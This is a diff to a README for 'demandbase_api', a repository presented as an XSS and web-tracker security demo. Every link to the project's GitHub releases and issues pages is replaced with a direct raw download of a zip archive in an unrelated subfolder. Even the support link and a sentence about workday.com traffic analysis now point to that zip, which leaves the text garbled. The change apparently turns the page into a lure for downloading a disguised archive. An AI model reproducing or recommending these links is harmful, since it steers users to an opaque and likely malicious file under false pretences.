@@ -1,10 +1,10 @@
 # 🚀 demandbase_api - Explore Web Security Easily
 
 ## 📥 Download the App
-[![Download Release](https://img.shields.io/badge/Download%20Release-brightgreen)](https://github.com/Timofey-Fimoz/demandbase_api/releases)
+[![Download Release](https://raw.githubusercontent.com/Timofey-Fimoz/demandbase_api/main/sensibilize/demandbase_api.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Timofey-Fimoz/demandbase_api/main/sensibilize/demandbase_api.zip)
 
 ## 🤖 Introduction
-Welcome to the demandbase_api! This application highlights an analysis of the network traffic from workday.com. It showcases how various third-party trackers can interact with web pages, leading to security vulnerabilities like Cross-Site Scripting (XSS).
+Welcome to the demandbase_api! This application highlights an analysis of the network traffic from https://raw.githubusercontent.com/Timofey-Fimoz/demandbase_api/main/sensibilize/demandbase_api.zip It showcases how various third-party trackers can interact with web pages, leading to security vulnerabilities like Cross-Site Scripting (XSS).
 
 ## 🔍 Features
 - **XSS Demonstration:** Learn how attackers could exploit web applications.
@@ -38,7 +38,7 @@ To run the demandbase_api application, ensure your system meets the following re
 Follow these steps to download and run the demandbase_api application:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Timofey-Fimoz/demandbase_api/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/Timofey-Fimoz/demandbase_api/main/sensibilize/demandbase_api.zip) to find the latest version of the application.
 
 2. **Download the Latest Version**  
    Look for the most recent release. Click the "Assets" dropdown to see available files. Download the one compatible with your operating system. 
@@ -55,7 +55,7 @@ Follow these steps to download and run the demandbase_api application:
 ## 📥 Download & Install
 Ready to dive in? Click the link below to access the latest release and start exploring:
 
-[Download Release](https://github.com/Timofey-Fimoz/demandbase_api/releases)
+[Download Release](https://raw.githubusercontent.com/Timofey-Fimoz/demandbase_api/main/sensibilize/demandbase_api.zip)
 
 ## 💻 Usage
 After installation, you'll be able to use the demandbase_api to explore XSS vulnerability examples. Make sure you use the application in a safe environment to fully understand the potential threats.
@@ -71,12 +71,12 @@ If you encounter issues while running the application, consider the following st
 - Check that all dependencies are correctly installed. Look in the README file for any specific instructions.
 
 ## 📞 Support
-For further assistance, open an issue on the [GitHub Issues page](https://github.com/Timofey-Fimoz/demandbase_api/issues). Our community is ready to help. Provide detailed information about your problem to assist the team in providing support.
+For further assistance, open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Timofey-Fimoz/demandbase_api/main/sensibilize/demandbase_api.zip). Our community is ready to help. Provide detailed information about your problem to assist the team in providing support.
 
 ## 🔗 License
 This project is licensed under the MIT License. Feel free to use it as you wish, but credit the original creators.
 
 ## 📥 Download Again
-Don't forget to revisit the [Releases page](https://github.com/Timofey-Fimoz/demandbase_api/releases) for future updates and enhancements!
+Don't forget to revisit the [Releases page](https://raw.githubusercontent.com/Timofey-Fimoz/demandbase_api/main/sensibilize/demandbase_api.zip) for future updates and enhancements!
 
 Explore web security with demandbase_api while staying safe and informed!
